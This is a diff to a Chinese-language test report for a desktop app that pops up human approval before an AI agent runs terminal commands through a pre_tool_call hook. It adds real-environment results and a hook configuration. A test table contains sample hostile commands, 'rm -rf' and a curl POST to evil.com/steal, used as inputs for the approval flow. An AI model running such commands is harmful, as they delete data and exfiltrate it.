@@ -28,25 +28,53 @@ v1 `tauri.conf.json` 设置 `visible: false`，窗口启动时隐藏，仅在需
 
 ## 测试结果
 
+### 模拟测试（bridge 脚本手动调用）
+
 | 场景 | 命令 | 桥接退出码 | pending 清理 | results 清理 |
 |------|------|-----------|-------------|-------------|
 | Approve | `rm -rf /tmp/test` | 0 | 通过 | 通过 |
 | Approve | `curl -X POST http://evil.com/steal` | 0 | 通过 | 通过 |
 
+### 真实环境测试（Hermes Agent）
+
+配置 `~/.hermes/config.yaml` 添加 `pre_tool_call` hook，指向 `hermes-approval-bridge.sh`。
+
+| 场景 | 命令 | 审批弹出 | 用户操作 | 命令继续 | 文件清理 |
+|------|------|---------|---------|---------|---------|
+| Hermes terminal | `pwd` | 通过 | Approve | 通过 | 通过 |
+| Hermes terminal | `ls -la` | 通过 | Approve | 通过 | 待确认 |
+
+**Hook 配置**:
+```yaml
+hooks:
+  - event: "pre_tool_call"
+    matcher: "terminal"
+    command: "/Users/dor/Projects/hermes-box-v2/bridge/hermes-approval-bridge.sh"
+    timeout: 120
+```
+
 ## 完整数据流验证
 
 ```
+模拟测试:
 1. Bridge script 写入 pending/approval-*.json  ✓
 2. Rust watcher 检测文件，发出 approval-request 事件  ✓
 3. 前端监听事件，弹出 ApprovalModal  ✓
 4. 用户点击 Approve → invoke("approve_command")  ✓
 5. Rust 写入 results/approval-*.json  ✓
 6. Bridge 轮询到结果，清理文件，退出 0  ✓
+
+真实环境 (Hermes):
+1. Hermes 执行终端命令 → pre_tool_call hook 拦截  ✓
+2. Bridge 写入 pending/hermes-*.json  ✓
+3. Rust watcher 检测 → 弹出审批模态框  ✓
+4. 用户点击 Approve → 结果写入  ✓
+5. Bridge 退出 → Hermes 继续执行命令  ✓
 ```
 
 ## 代码变更
 
-本次测试未修改代码，仅验证现有实现。
+- `~/.hermes/config.yaml`：添加 `pre_tool_call` hook 配置
 
 ## 测试输出
 
@@ -61,3 +89,4 @@ Rust:      37 tests passed (cargo test 未重新运行，上次通过)
 - [ ] 超时测试：不操作等待 120 秒验证默认拒绝
 - [ ] 多请求并发测试：同时发送多个审批请求
 - [ ] tauri.conf.json：添加 `visible: false` 对齐 v1 行为，避免 Vite 崩溃时白屏
+- [ ] Claude Code hook 测试：配置 `.claude/settings.json` 的 PreToolUse hook
